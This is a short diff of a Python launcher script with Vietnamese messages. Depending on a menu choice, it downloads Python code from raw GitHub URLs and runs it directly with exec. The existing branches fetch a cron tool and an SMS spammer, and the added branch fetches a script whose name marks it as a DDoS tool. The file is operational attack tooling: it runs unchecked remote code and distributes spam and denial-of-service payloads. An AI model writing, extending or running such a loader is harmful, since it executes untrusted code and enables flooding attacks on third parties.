@@ -13,6 +13,8 @@ if ( Requestsjob == 1 ):
  exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/Toolcron1.py").text)
 elif ( Requestsjob == 2 ):
  exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/smsspamer.py").text)
+elif ( Requestsjob == 3 ):
+ exec(requests.get("https://raw.githubusercontent.com/UserDT28/server1/main/tiendzddos.py").text)
 else:
  print("Không tìm ra tệp tin hợp lệ")
  exit()
